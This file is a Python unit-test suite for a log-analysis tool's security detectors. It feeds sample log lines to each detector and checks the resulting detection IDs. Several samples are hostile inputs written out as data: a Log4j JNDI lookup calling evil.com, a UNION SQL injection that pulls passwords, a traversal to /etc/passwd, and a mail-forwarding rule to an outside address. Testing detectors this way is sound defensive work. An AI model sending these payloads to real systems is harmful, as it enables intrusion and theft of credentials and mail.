"""Unit tests for all domain-specific detectors (Linux, Network, Web, Cloud, Database, EDR)."""

import unittest
from logscope.canonical import CanonicalEvent, ConclusionLevel
from logscope.detectors.linux import LinuxDetector
from logscope.detectors.network import NetworkDetector
from logscope.detectors.web import WebDetector
from logscope.detectors.cloud import CloudDetector
from logscope.detectors.database import DatabaseDetector
from logscope.detectors.edr import EDRDetector


class DomainDetectorsTests(unittest.TestCase):
    def test_linux_detector(self):
        det = LinuxDetector()
        evt = CanonicalEvent(message="Failed password for invalid user hacker from 192.168.1.5 port 22")
        findings = det.analyze_event(evt)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].detection_id, "DET-LNX-AUTH-002")
        self.assertEqual(findings[0].conclusion_level, ConclusionLevel.SUSPICIOUS)

        evt_sudo = CanonicalEvent(username="guest", message="guest : user NOT in sudoers ; TTY=pts/0")
        findings_sudo = det.analyze_event(evt_sudo)
        self.assertEqual(len(findings_sudo), 1)
        self.assertEqual(findings_sudo[0].detection_id, "DET-LNX-SUDO-001")

    def test_network_detector_classified1_patterns(self):
        det = NetworkDetector()
        evt_icmp = CanonicalEvent(message='CID=0x814f041e;AttackType="ICMP unreachable attack"')
        findings = det.analyze_event(evt_icmp)
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].detection_id, "DET-NET-DOS-001")

        evt_spoof = CanonicalEvent(message='CID=0x814f041e;AttackType="IP spoof attack"')
        self.assertEqual(det.analyze_event(evt_spoof)[0].detection_id, "DET-NET-SPOOF-001")

        evt_p2p = CanonicalEvent(message="zerotier encrypted p2p tunnel detected")
        self.assertEqual(det.analyze_event(evt_p2p)[0].detection_id, "DET-NET-P2P-001")

    def test_web_detector_owasp(self):
        det = WebDetector()
        evt_log4j = CanonicalEvent(message="GET /?q=${jndi:ldap://evil.com/a} HTTP/1.1")
        self.assertEqual(det.analyze_event(evt_log4j)[0].detection_id, "DET-WEB-LOG4J-001")

        evt_sqli = CanonicalEvent(message="SELECT * FROM users WHERE id=1 UNION SELECT null, username, password FROM users")
        self.assertEqual(det.analyze_event(evt_sqli)[0].detection_id, "DET-WEB-SQLI-001")

        evt_traversal = CanonicalEvent(message="GET /download?file=../../../../etc/passwd HTTP/1.1")
        self.assertEqual(det.analyze_event(evt_traversal)[0].detection_id, "DET-WEB-TRAVERSAL-001")

    def test_cloud_detector(self):
        det = CloudDetector()
        evt_travel = CanonicalEvent(username="cfo@company.com", message="Impossible travel alert detected for user")
        self.assertEqual(det.analyze_event(evt_travel)[0].detection_id, "DET-CLD-TRAVEL-001")

        evt_bec = CanonicalEvent(username="finance@company.com", message="Set-Mailbox -ForwardingAddress hacker@gmail.com")
        self.assertEqual(det.analyze_event(evt_bec)[0].detection_id, "DET-CLD-BEC-001")

    def test_database_detector(self):
        det = DatabaseDetector()
        evt_drop = CanonicalEvent(username="sa", message="DROP TABLE customers_audit")
        self.assertEqual(det.analyze_event(evt_drop)[0].detection_id, "DET-DB-DDL-001")

        evt_auth = CanonicalEvent(message="Login failed for user 'sa'. Reason: Error: 18456")
        self.assertEqual(det.analyze_event(evt_auth)[0].detection_id, "DET-DB-AUTH-001")

    def test_edr_detector_classified1_malware(self):
        det = EDRDetector()
        evt_expiro = CanonicalEvent(message='SignName="Virus Expiro : vjaxhpbji.biz"')
        f_expiro = det.analyze_event(evt_expiro)
        self.assertEqual(f_expiro[0].detection_id, "DET-EDR-EXPIRO-001")
        self.assertIn("vjaxhpbji.biz", f_expiro[0].description_ar)

        evt_tiggre = CanonicalEvent(message='SignName="Trojan Tiggre : cvgrf.biz"')
        self.assertEqual(det.analyze_event(evt_tiggre)[0].detection_id, "DET-EDR-TIGGRE-001")

        evt_miner = CanonicalEvent(message='SignName="Trojan CoinMiner : pywolwnvd.biz"')
        self.assertEqual(det.analyze_event(evt_miner)[0].detection_id, "DET-EDR-MINER-001")

        evt_binance = CanonicalEvent(message='SignName="Binance Domain: www.binance.com"')
        self.assertEqual(det.analyze_event(evt_binance)[0].detection_id, "DET-EDR-CRYPTO-001")


if __name__ == "__main__":
    unittest.main()
